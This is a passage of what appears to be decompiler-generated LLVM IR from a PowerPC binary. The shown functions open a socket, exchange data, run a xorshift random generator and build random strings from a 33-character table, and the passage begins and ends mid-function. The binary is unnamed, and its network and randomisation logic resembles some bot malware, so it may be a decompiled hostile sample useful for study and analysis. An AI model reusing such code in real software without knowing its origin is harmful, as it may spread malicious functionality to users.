  %v3_10007a20 = icmp eq i32 %v4_10007a14, 0
  br i1 %v3_10007a20, label %dec_label_pc_10007a80, label %dec_label_pc_10007a28

dec_label_pc_10007a28:                            ; preds = %dec_label_pc_10007a20
  %v3_10007a28 = load i16, i16* %stack_var_-1656, align 2
  %v4_10007a28 = sext i16 %v3_10007a28 to i32
  store i32 %v4_10007a28, i32* %r5.global-to-local, align 4
  %v1_10007a2c = urem i32 %v4_10007a28, 65536
  store i32 %v1_10007a2c, i32* %r0.global-to-local, align 4
  %v3_10007a30 = icmp eq i32 %v1_10007a2c, 0
  br i1 %v3_10007a30, label %dec_label_pc_10007c50, label %dec_label_pc_10007a38

dec_label_pc_10007a38:                            ; preds = %dec_label_pc_10007a28
  %tmp81 = icmp ult i32 %v1_10007a2c, 1025
  br i1 %tmp81, label %dec_label_pc_10007a54, label %dec_label_pc_10007a40

dec_label_pc_10007a40:                            ; preds = %dec_label_pc_10007a38
  store i32 ptrtoint (i32* @global_var_10007a48.164 to i32), i32* @lr, align 4
  %v0_10007a44 = call i32 @function_1000b3f0()
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_1001eaf4.161, align 4
  %v3_10007a50 = load i16, i16* %stack_var_-1656, align 2
  %v4_10007a50 = sext i16 %v3_10007a50 to i32
  store i32 %v4_10007a50, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007a54

dec_label_pc_10007a54:                            ; preds = %dec_label_pc_10007a38, %dec_label_pc_10007a40
  %v0_10007a54 = load i32, i32* @r31, align 4
  %v1_10007a54 = load i32, i32* @r23, align 4
  %v2_10007a54 = inttoptr i32 %v1_10007a54 to i32*
  store i32 %v0_10007a54, i32* %v2_10007a54, align 4
  store i32 %v2_10007a58, i32* @r31, align 4
  %v0_10007a5c = load i32, i32* %r5.global-to-local, align 4
  %v1_10007a5c = urem i32 %v0_10007a5c, 65536
  store i32 %v1_10007a5c, i32* %r5.global-to-local, align 4
  %v3_10007a64 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 268466800, i32* @lr, align 4
  %v4_10007a6c = call i32 @function_1000c090(i32 %v3_10007a64, i32 %v2_10007a58, i32 %v1_10007a5c, i32 16386)
  %v3_10007a70 = icmp eq i32 %v4_10007a6c, -1
  br i1 %v3_10007a70, label %dec_label_pc_10007c38, label %dec_label_pc_10007a78

dec_label_pc_10007a78:                            ; preds = %dec_label_pc_10007a54
  %v3_10007a78 = icmp eq i32 %v4_10007a6c, 0
  br i1 %v3_10007a78, label %dec_label_pc_10007a80, label %dec_label_pc_10007c68

dec_label_pc_10007a80:                            ; preds = %dec_label_pc_10007c44, %dec_label_pc_10007a78, %dec_label_pc_10007a20
  %v3_10007a80 = load i32, i32* @global_var_1001eaf4.161, align 4
  %v3_10007a84 = icmp eq i32 %v3_10007a80, -1
  br i1 %v3_10007a84, label %dec_label_pc_10007a90, label %dec_label_pc_10007a8c

dec_label_pc_10007a8c:                            ; preds = %dec_label_pc_10007a80
  store i32 ptrtoint (i32* @global_var_10007a90.165 to i32), i32* @lr, align 4
  %v0_10007a8c = call i32 @function_1000b3f0()
  br label %dec_label_pc_10007a90

dec_label_pc_10007a90:                            ; preds = %dec_label_pc_10007a80, %dec_label_pc_10007a8c
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 -1, i32* @global_var_1001eaf4.161, align 4
  store i32 268466852, i32* @lr, align 4
  %v1_10007aa0 = call i32 @function_1000cce4(i32 1)
  br label %dec_label_pc_10007804

dec_label_pc_10007aa8:                            ; preds = %dec_label_pc_10007868
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 268466872, i32* @lr, align 4
  %v3_10007ab4 = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  %v3_10007ab8 = icmp eq i32 %v3_10007ab4, -1
  store i32 %v3_10007ab4, i32* @r31, align 4
  store i32 %v3_10007ab4, i32* @global_var_1001eaf4.161, align 4
  br i1 %v3_10007ab8, label %dec_label_pc_10007878, label %dec_label_pc_10007ac8

dec_label_pc_10007ac8:                            ; preds = %dec_label_pc_10007aa8
  store i32 3, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 268466904, i32* @lr, align 4
  %v1_10007ad4 = call i32 @function_1000b2c0(i32 3)
  store i32 4, i32* @r4, align 4
  %v1_10007adc = or i32 %v1_10007ad4, 2048
  store i32 %v1_10007adc, i32* %r5.global-to-local, align 4
  %v0_10007ae0 = load i32, i32* @r31, align 4
  store i32 268466924, i32* @lr, align 4
  %v2_10007ae8 = call i32 @function_1000b2c0(i32 %v0_10007ae0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10007af0 = load i32, i32* @global_var_1001eaf8.124, align 4
  store i32 %v3_10007af0, i32* %r0.global-to-local, align 4
  %v3_10007af4 = icmp eq i32 %v3_10007af0, 0
  br i1 %v3_10007af4, label %dec_label_pc_10007b04, label %dec_label_pc_10007afc

dec_label_pc_10007afc:                            ; preds = %dec_label_pc_10007ac8
  store i32 %v3_10007af0, i32* %ctr.global-to-local, align 4
  store i32 268466948, i32* @lr, align 4
  %v2_10007b00 = call i32 @function_1000ae68(i32 %v2_10007ae8)
  br label %dec_label_pc_10007b04

dec_label_pc_10007b04:                            ; preds = %dec_label_pc_10007ac8, %dec_label_pc_10007afc
  %v3_10007b04 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 %v3_10007b04, i32* @r3, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r5.global-to-local, align 4
  store i8 1, i8* @global_var_1001eb28.162, align 1
  store i32 268466972, i32* @lr, align 4
  %v0_10007b18 = call i32 @function_1000bfbc()
  %v3_100079a4.pre = load i32, i32* @global_var_1001eaf4.161, align 4
  br label %dec_label_pc_10007878

dec_label_pc_10007b20:                            ; preds = %dec_label_pc_100078f4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10007b28 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 268467000, i32* @lr, align 4
  %v4_10007b34 = call i32 @function_1000c108(i32 %v3_10007b28, i32 %v2_10007390, i32 2, i32 16384)
  br label %dec_label_pc_10007920

dec_label_pc_10007b3c:                            ; preds = %dec_label_pc_10007954
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 0, i32* %stack_var_-1648, align 4
  store i32 4, i32* %stack_var_-1644, align 4
  store i32 268467040, i32* @lr, align 4
  %v5_10007b5c = call i32 @function_1000c024(i32 1, i32 4, i32 %v2_100077dc, i32 %v2_10007b50, i32 4)
  %v3_10007b60 = load i32, i32* %stack_var_-1648, align 4
  store i32 %v3_10007b60, i32* %r0.global-to-local, align 4
  %v3_10007b64 = icmp eq i32 %v3_10007b60, 0
  br i1 %v3_10007b64, label %dec_label_pc_10007bd8, label %dec_label_pc_10007b6c

dec_label_pc_10007b6c:                            ; preds = %dec_label_pc_10007b3c
  store i32 ptrtoint (i32* @global_var_10007b74.166 to i32), i32* @lr, align 4
  %v0_10007b70 = call i32 @function_1000b3f0()
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_1001eaf4.161, align 4
  %v0_10007b7c = call i32 @function_10007ca8()
  %v1_10007b7c = sext i32 %v0_10007b7c to i64
  %v5_10007b88 = mul nuw nsw i64 %v1_10007b7c, 3435973837
  %v1_10007b8c7 = udiv i64 %v5_10007b88, 34359738368
  %v1_10007b8c = trunc i64 %v1_10007b8c7 to i32
  %v1_10007b90 = mul i32 %v1_10007b8c, 10
  store i32 %v1_10007b90, i32* %r0.global-to-local, align 4
  %v3_10007b94 = sub i32 %v0_10007b7c, %v1_10007b90
  %v1_10007b98 = add i32 %v3_10007b94, 1
  store i32 268467104, i32* @lr, align 4
  %v1_10007b9c = call i32 @function_1000cce4(i32 %v1_10007b98)
  br label %dec_label_pc_10007804

dec_label_pc_10007ba4:                            ; preds = %dec_label_pc_1000792c
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 %v2_100077dc, i32* %r5.global-to-local, align 4
  store i32 16, i32* %stack_var_-1648, align 4
  store i32 ptrtoint (i32* @global_var_10007bb8.168 to i32), i32* @lr, align 4
  %v3_10007bb4 = call i32 @function_1000bf54(i32 %v2_10007bac, i32 %v2_100077dc, i32 %v1_10007940)
  store i32 268467132, i32* @lr, align 4
  %v1_10007bb8 = call i32 @function_10008540(i32 %v3_10007bb4)
  store i32 268467136, i32* @lr, align 4
  %v1_10007bbc = call i32 @function_100061f0(i32 %v1_10007bb8)
  store i32 ptrtoint ([3 x i8]* @global_var_10007bc4.169 to i32), i32* @lr, align 4
  %v1_10007bc0 = call i32 @function_10002140(i32 %v1_10007bbc)
  %v0_10007bc4 = load i32, i32* @r18, align 4
  %v1_10007bc4 = sub i32 0, %v0_10007bc4
  store i32 ptrtoint ([3 x i8]* @global_var_10007bd0.170 to i32), i32* @lr, align 4
  %v2_10007bcc = call i32 @function_1000b510(i32 %v1_10007bc4, i32 9)
  %v0_10007bd4 = call i32 @function_1000cc60()
  br label %dec_label_pc_10007bd8

dec_label_pc_10007bd8:                            ; preds = %dec_label_pc_10007b3c, %dec_label_pc_10007ba4
  store i32 268467168, i32* @lr, align 4
  %v2_10007bdc = call i32 @function_1000ab64(i8* %v1_10007bdc)
  %v3_10007bdc = trunc i32 %v2_10007bdc to i16
  store i16 %v3_10007bdc, i16* %stack_var_-1656, align 2
  store i32 268467176, i32* @lr, align 4
  %v2_10007be4 = call i32 @function_1000ae68(i32 %v2_10007bdc)
  store i32 %v2_10007be4, i32* @global_var_1001eb10.71, align 4
  %v0_10007bf0 = load i32, i32* @r31, align 4
  %v1_10007bf0 = add i32 %v0_10007bf0, -5388
  %v2_10007bf0 = inttoptr i32 %v1_10007bf0 to i32*
  %v3_10007bf0 = load i32, i32* %v2_10007bf0, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 268467204, i32* @lr, align 4
  %v4_10007c00 = call i32 @function_1000c108(i32 %v3_10007bf0, i32 ptrtoint (i32* @global_var_1000ded4.171 to i32), i32 4, i32 16384)
  %v0_10007c04 = load i32, i32* @r31, align 4
  %v1_10007c04 = add i32 %v0_10007c04, -5388
  %v2_10007c04 = inttoptr i32 %v1_10007c04 to i32*
  %v3_10007c04 = load i32, i32* %v2_10007c04, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  store i32 268467224, i32* @lr, align 4
  %v4_10007c14 = call i32 @function_1000c108(i32 %v3_10007c04, i32 %v2_10007390, i32 1, i32 16384)
  %v3_10007c18 = load i16, i16* %stack_var_-1656, align 2
  %v4_10007c18 = sext i16 %v3_10007c18 to i32
  store i32 %v4_10007c18, i32* %r5.global-to-local, align 4
  %v3_10007c1c = icmp eq i16 %v3_10007c18, 0
  br i1 %v3_10007c1c, label %dec_label_pc_10007804, label %dec_label_pc_10007c24

dec_label_pc_10007c24:                            ; preds = %dec_label_pc_10007bd8
  %v0_10007c24 = load i32, i32* @r31, align 4
  %v1_10007c24 = add i32 %v0_10007c24, -5388
  %v2_10007c24 = inttoptr i32 %v1_10007c24 to i32*
  %v3_10007c24 = load i32, i32* %v2_10007c24, align 4
  store i32 268467252, i32* @lr, align 4
  %v4_10007c30 = call i32 @function_1000c108(i32 %v3_10007c24, i32 %v1_10007bd8, i32 %v4_10007c18, i32 16384)
  br label %dec_label_pc_10007804

dec_label_pc_10007c38:                            ; preds = %dec_label_pc_10007a54, %dec_label_pc_100079f8
  %v0_10007c38 = load i32, i32* @r23, align 4
  %v1_10007c38 = inttoptr i32 %v0_10007c38 to i32*
  %v2_10007c38 = load i32, i32* %v1_10007c38, align 4
  %v3_10007c3c = icmp eq i32 %v2_10007c38, 11
  br i1 %v3_10007c3c, label %dec_label_pc_10007804, label %dec_label_pc_10007c44

dec_label_pc_10007c44:                            ; preds = %dec_label_pc_10007c38
  %v3_10007c44 = icmp eq i32 %v2_10007c38, 4
  br i1 %v3_10007c44, label %dec_label_pc_10007804, label %dec_label_pc_10007a80

dec_label_pc_10007c50:                            ; preds = %dec_label_pc_10007a28
  %v3_10007c50 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 268467300, i32* @lr, align 4
  %v4_10007c60 = call i32 @function_1000c090(i32 %v3_10007c50, i32 %v2_10007390, i32 2, i32 16384)
  br label %dec_label_pc_10007804

dec_label_pc_10007c68:                            ; preds = %dec_label_pc_10007a78
  %v3_10007c68 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 268467324, i32* @lr, align 4
  %v4_10007c78 = call i32 @function_1000c090(i32 %v3_10007c68, i32 %v2_10007390, i32 2, i32 16384)
  %v3_10007c7c = load i32, i32* @global_var_1001eaf4.161, align 4
  %v3_10007c80 = load i16, i16* %stack_var_-1656, align 2
  %v4_10007c80 = sext i16 %v3_10007c80 to i32
  store i32 %v4_10007c80, i32* %r5.global-to-local, align 4
  store i32 268467344, i32* @lr, align 4
  %v4_10007c8c = call i32 @function_1000c090(i32 %v3_10007c7c, i32 %v2_10007a58, i32 %v4_10007c80, i32 16384)
  %v3_10007c90 = load i16, i16* %stack_var_-1656, align 2
  %v3_10007c94 = icmp eq i16 %v3_10007c90, 0
  br i1 %v3_10007c94, label %dec_label_pc_10007804, label %dec_label_pc_10007c9c

dec_label_pc_10007c9c:                            ; preds = %dec_label_pc_10007c68
  %v4_10007c90 = sext i16 %v3_10007c90 to i32
  store i32 268467364, i32* @lr, align 4
  %v2_10007ca0 = call i32 @function_10001eac(i32 %v2_10007a58, i32 %v4_10007c90)
  br label %dec_label_pc_10007804

; uselistorder directives
  uselistorder i16 %v3_10007c90, { 1, 0 }
  uselistorder i32 %v3_10007ab4, { 1, 0, 2 }
  uselistorder i32 %v1_10007a5c, { 1, 0 }
  uselistorder i32 %v1_10007a2c, { 2, 1, 0 }
  uselistorder i32 %v1_100079f0, { 1, 0 }
  uselistorder i32 %v3_100079cc, { 0, 2, 5, 3, 1, 4 }
  uselistorder i32 %v1_10007940, { 2, 1, 0 }
  uselistorder i32 %v2_10007908, { 1, 0, 2 }
  uselistorder i32 %v0_100078f8, { 2, 0, 1 }
  uselistorder i32 %v2_100079b4, { 1, 0 }
  uselistorder i32 %v1_10007838, { 1, 0 }
  uselistorder i32 %v1_10007834, { 1, 0 }
  uselistorder i32 %v1_1000781c, { 1, 0 }
  uselistorder i32 %v1_10007818, { 1, 0 }
  uselistorder i32 %v2_100077dc, { 2, 1, 0 }
  uselistorder i32 %v3_10007744, { 1, 2, 0 }
  uselistorder i32 %v1_10007670, { 1, 0 }
  uselistorder i32 %v1_10007624, { 1, 0 }
  uselistorder i32 %v1_100075a0, { 1, 0 }
  uselistorder i32 %v1_10007590, { 1, 0 }
  uselistorder i32 %v0_10007574, { 1, 0 }
  uselistorder i32 %v1_10007560, { 1, 0 }
  uselistorder i32 %v0_10007550, { 1, 0 }
  uselistorder i32 %v1_10007548, { 1, 0 }
  uselistorder i32 %v1_10007528, { 1, 0 }
  uselistorder i32 %v0_10007518, { 1, 0 }
  uselistorder i32 %v1_10007510, { 1, 0 }
  uselistorder i32 %v1_100074f0, { 1, 0 }
  uselistorder i32 %v0_100074e0, { 1, 0 }
  uselistorder i32 %v1_100074d8, { 1, 0 }
  uselistorder i32 %v1_100074b8, { 1, 0 }
  uselistorder i32 %v0_100074a8, { 1, 0 }
  uselistorder i32 %v1_100074a0, { 1, 0 }
  uselistorder i32 %v0_10007474, { 1, 0 }
  uselistorder i32 %v2_10007390, { 4, 5, 3, 1, 0, 2, 6 }
  uselistorder i32 %v2_100072ac, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-1648, { 0, 1, 2, 4, 3, 5 }
  uselistorder i16* %stack_var_-1656, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-1632, { 1, 0 }
  uselistorder i8** %stack_var_-1604, { 0, 2, 1 }
  uselistorder i32* %stack_var_-1586, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_-1652, { 1, 0 }
  uselistorder i8 %tmp35, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 28, 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 32, 33, 14, 15, 16, 30, 31, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %r5.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 33, 34, 35, 36, 37, 38, 39, 0, 1, 2, 3, 7, 8, 9, 10, 11, 12, 4, 5, 6, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %ctr.global-to-local, { 0, 1, 10, 11, 2, 3, 4, 8, 9, 5, 6, 7 }
  uselistorder i32 16386, { 1, 0, 2 }
  uselistorder i8* @global_var_1001eb28.162, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1001eaf4.161, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16 }
  uselistorder i32 ()* @function_10008804, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1000a260, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000b850, { 1, 0 }
  uselistorder i32 (i32)* @function_1000a2ec, { 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_1000ab8c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 59, 61, 60, 26, 27, 28, 29, 53, 54, 55, 56, 57, 58, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 ()* @function_10006fec, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000de44.8 to i32), { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @function_1000c298, { 1, 0 }
  uselistorder i32 (i32)* @function_1000b808, { 1, 0 }
  uselistorder label %dec_label_pc_10007bd8, { 1, 0 }
  uselistorder label %dec_label_pc_10007b04, { 1, 0 }
  uselistorder label %dec_label_pc_10007a90, { 1, 0 }
  uselistorder label %dec_label_pc_10007a54, { 1, 0 }
  uselistorder label %dec_label_pc_10007990, { 1, 0 }
  uselistorder label %dec_label_pc_10007920, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100078bc, { 1, 0 }
  uselistorder label %dec_label_pc_10007878, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007868, { 1, 0 }
  uselistorder label %dec_label_pc_10007830.dec_label_pc_10007830_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10007814.dec_label_pc_10007814_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10007804, { 9, 4, 10, 0, 5, 11, 6, 12, 7, 1, 2, 8, 3, 13 }
  uselistorder label %dec_label_pc_10007614, { 3, 1, 0, 2 }
}

define i32 @function_10007ca8() local_unnamed_addr {
dec_label_pc_10007ca8:
  %v3_10007cb0 = load i32, i32* @global_var_1001ebc8.172, align 4
  %v3_10007cb8 = load i32, i32* @global_var_1001ebbc.173, align 4
  %v1_10007cc0 = udiv i32 %v3_10007cb0, 524288
  %v3_10007cc4 = load i32, i32* @global_var_1001ebc4.174, align 4
  %v1_10007cc8 = mul i32 %v3_10007cb8, 2048
  %v2_10007ccc = xor i32 %v1_10007cc0, %v3_10007cb0
  %v2_10007cd0 = xor i32 %v1_10007cc8, %v3_10007cb8
  %v3_10007cd4 = load i32, i32* @global_var_1001ebc0.175, align 4
  %v2_10007cd8 = xor i32 %v2_10007ccc, %v2_10007cd0
  %v1_10007cdc = udiv i32 %v2_10007cd0, 256
  %v2_10007ce0 = xor i32 %v2_10007cd8, %v1_10007cdc
  store i32 %v3_10007cd4, i32* @global_var_1001ebbc.173, align 4
  store i32 %v3_10007cc4, i32* @global_var_1001ebc0.175, align 4
  store i32 %v3_10007cb0, i32* @global_var_1001ebc4.174, align 4
  store i32 %v2_10007ce0, i32* @global_var_1001ebc8.172, align 4
  ret i32 %v2_10007ce0

; uselistorder directives
  uselistorder i32 %v2_10007ce0, { 1, 0 }
  uselistorder i32 %v3_10007cb8, { 1, 0 }
  uselistorder i32 %v3_10007cb0, { 2, 1, 0 }
}

define i32 @function_10007cf8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007cf8:
  store i32 268467480, i32* @lr, align 4
  %v0_10007d14 = call i32 @function_1000b7c0()
  store i32 %v0_10007d14, i32* @global_var_1001ebbc.173, align 4
  store i32 268467492, i32* @lr, align 4
  %v0_10007d20 = call i32 @function_1000b480()
  store i32 268467500, i32* @lr, align 4
  %v0_10007d28 = call i32 @function_1000b4c8()
  %v2_10007d2c = xor i32 %v0_10007d20, %v0_10007d28
  store i32 %v2_10007d2c, i32* @global_var_1001ebc0.175, align 4
  store i32 268467512, i32* @lr, align 4
  %v1_10007d34 = call i32 @function_1000bb18(i32 %v0_10007d28)
  %v3_10007d38 = load i32, i32* @global_var_1001ebc0.175, align 4
  %v2_10007d48 = xor i32 %v3_10007d38, %v1_10007d34
  store i32 %v2_10007d48, i32* @global_var_1001ebc8.172, align 4
  store i32 %v1_10007d34, i32* @global_var_1001ebc4.174, align 4
  ret i32 %v1_10007d34

; uselistorder directives
  uselistorder i32 %v1_10007d34, { 2, 1, 0 }
  uselistorder i32 %v0_10007d28, { 1, 0 }
  uselistorder i32 ()* @function_1000b4c8, { 1, 2, 0 }
}

define i32 @function_10007d68(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007d68:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_gt.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 33, i32* @r5, align 4
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_1000df14.176 to i32), i32* @r4, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v2_10007d8c = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10007d8c, i32* @r3, align 4
  store i32 268467632, i32* @lr, align 4
  %v0_10007dac = call i32 @function_1000bb50()
  store i32 %v0_10007dac, i32* %r3.global-to-local, align 4
  %v0_10007db0 = load i32, i32* %r30.global-to-local, align 4
  %v1_10007db0 = icmp slt i32 %v0_10007db0, 0
  %v2_10007db0 = icmp sgt i32 %v0_10007db0, 0
  %v3_10007db0 = icmp eq i32 %v0_10007db0, 0
  store i1 %v1_10007db0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10007db0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10007db0, i1* %cr7_eq.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_10007db0, 1
  br i1 %tmp20, label %dec_label_pc_10007ea4, label %dec_label_pc_10007db8

dec_label_pc_10007db8:                            ; preds = %dec_label_pc_10007d68
  %v3_10007dcc = load i32, i32* @global_var_1001ebc8.172, align 4
  store i32 %v3_10007dcc, i32* %r4.global-to-local, align 4
  %v3_10007dd0 = load i32, i32* @global_var_1001ebc4.174, align 4
  store i32 %v3_10007dd0, i32* %r29.global-to-local, align 4
  store i32 1041204193, i32* %r28.global-to-local, align 4
  %v3_10007dd8 = load i32, i32* @global_var_1001ebc0.175, align 4
  store i32 %v3_10007dd8, i32* %r12.global-to-local, align 4
  %v3_10007ddc = load i32, i32* @global_var_1001ebbc.173, align 4
  store i32 %v3_10007ddc, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007e44

dec_label_pc_10007de4:                            ; preds = %dec_label_pc_10007e44
  %v2_10007de4 = call i32 @__asm_rlwinm(i32 %v2_10007e64, i32 29, i32 27, i32 31)
  %v2_10007de8 = call i32 @__asm_rlwinm(i32 %v2_10007e64, i32 21, i32 27, i32 31)
  store i32 %v2_10007de8, i32* %r9.global-to-local, align 4
  %v0_10007dec = load i32, i32* %r30.global-to-local, align 4
  %v1_10007dec = add i32 %v0_10007dec, -4
  store i32 %v1_10007dec, i32* %r30.global-to-local, align 4
  %v0_10007df0 = load i32, i32* @r1, align 4
  %v2_10007df0 = add i32 %v0_10007df0, %v2_10007de4
  store i32 %v2_10007df0, i32* %r11.global-to-local, align 4
  %v2_10007df4 = add i32 %v0_10007df0, %v2_10007de8
  store i32 %v2_10007df4, i32* %r6.global-to-local, align 4
  %v2_10007df8 = call i32 @__asm_rlwinm(i32 %v2_10007e64, i32 13, i32 27, i32 31)
  %v2_10007dfc = udiv i32 %v2_10007e5c, 134217728
  store i32 %v2_10007dfc, i32* %r9.global-to-local, align 4
  %v0_10007e00 = load i32, i32* %r30.global-to-local, align 4
  %v1_10007e00 = icmp slt i32 %v0_10007e00, 0
  %v2_10007e00 = icmp sgt i32 %v0_10007e00, 0
  %v3_10007e00 = icmp eq i32 %v0_10007e00, 0
  store i1 %v1_10007e00, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10007e00, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10007e00, i1* %cr7_eq.global-to-local, align 1
  %v0_10007e04 = load i32, i32* @r1, align 4
  %v2_10007e04 = add i32 %v0_10007e04, %v2_10007df8
  store i32 %v2_10007e04, i32* %r10.global-to-local, align 4
  %v2_10007e08 = add i32 %v0_10007e04, %v2_10007dfc
  %v0_10007e0c = load i32, i32* %r11.global-to-local, align 4
  %v1_10007e0c = add i32 %v0_10007e0c, 8
  %v2_10007e0c = inttoptr i32 %v1_10007e0c to i8*
  %v3_10007e0c = load i8, i8* %v2_10007e0c, align 1
  %v1_10007e10 = add i32 %v2_10007e04, 8
  %v2_10007e10 = inttoptr i32 %v1_10007e10 to i8*
  %v3_10007e10 = load i8, i8* %v2_10007e10, align 1
  %v4_10007e10 = zext i8 %v3_10007e10 to i32
  store i32 %v4_10007e10, i32* %r7.global-to-local, align 4
  %v0_10007e14 = load i32, i32* %r12.global-to-local, align 4
  store i32 %v0_10007e14, i32* %r10.global-to-local, align 4
  %v0_10007e18 = load i32, i32* %r6.global-to-local, align 4
  %v1_10007e18 = add i32 %v0_10007e18, 8
  %v2_10007e18 = inttoptr i32 %v1_10007e18 to i8*
  %v3_10007e18 = load i8, i8* %v2_10007e18, align 1
  %v4_10007e18 = zext i8 %v3_10007e18 to i32
  store i32 %v4_10007e18, i32* %r9.global-to-local, align 4
  %v1_10007e1c = add i32 %v2_10007e08, 8
  %v2_10007e1c = inttoptr i32 %v1_10007e1c to i8*
  %v3_10007e1c = load i8, i8* %v2_10007e1c, align 1
  %v4_10007e1c = zext i8 %v3_10007e1c to i32
  store i32 %v4_10007e1c, i32* %r11.global-to-local, align 4
  %v2_10007e20 = load i32, i32* %r31.global-to-local, align 4
  %v3_10007e20 = inttoptr i32 %v2_10007e20 to i8*
  store i8 %v3_10007e0c, i8* %v3_10007e20, align 1
  %v0_10007e24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007e24 = trunc i32 %v0_10007e24 to i8
  %v2_10007e24 = load i32, i32* %r31.global-to-local, align 4
  %v3_10007e24 = add i32 %v2_10007e24, 1
  %v4_10007e24 = inttoptr i32 %v3_10007e24 to i8*
  store i8 %v1_10007e24, i8* %v4_10007e24, align 1
  %v0_10007e28 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007e28 = add i32 %v0_10007e28, 4
  store i32 %v1_10007e28, i32* %r31.global-to-local, align 4
  %v0_10007e2c = load i32, i32* %r11.global-to-local, align 4
  %v1_10007e2c = trunc i32 %v0_10007e2c to i8
  %v2_10007e2c = load i32, i32* %r3.global-to-local, align 4
  %v3_10007e2c = add i32 %v2_10007e2c, 2
  %v4_10007e2c = inttoptr i32 %v3_10007e2c to i8*
  store i8 %v1_10007e2c, i8* %v4_10007e2c, align 1
  %v0_10007e30 = load i32, i32* %r7.global-to-local, align 4
  %v1_10007e30 = trunc i32 %v0_10007e30 to i8
  %v2_10007e30 = load i32, i32* %r3.global-to-local, align 4
  %v3_10007e30 = add i32 %v2_10007e30, 1
  %v4_10007e30 = inttoptr i32 %v3_10007e30 to i8*
  store i8 %v1_10007e30, i8* %v4_10007e30, align 1
  %v0_10007e34 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10007e34 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10007e34 = or i1 %v0_10007e34, %v1_10007e34
